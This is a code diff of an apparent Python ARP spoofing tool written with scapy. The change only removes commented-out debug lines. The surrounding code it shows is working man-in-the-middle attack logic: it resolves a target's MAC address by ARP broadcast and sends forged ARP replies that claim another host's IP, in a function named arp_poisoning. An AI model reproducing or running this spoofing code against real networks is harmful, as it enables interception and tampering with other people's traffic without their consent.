@@ -4,9 +4,7 @@ import optparse
 
 def get_mac_address(ip):
     arp_request_packet = scapy.ARP(pdst=ip)
-    #scapy.ls(scapy.ARP())
     broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    #scapy.ls(scapy.Ether())
     combined_packet = broadcast_packet/arp_request_packet
     answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
 
@@ -18,7 +16,6 @@ def arp_poisoning(target_ip,poisoned_ip):
 
     arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
     scapy.send(arp_response,verbose=False)
-    #scapy.ls(scapy.ARP())
 
 def reset_operation(fooled_ip,gateway_ip):
 
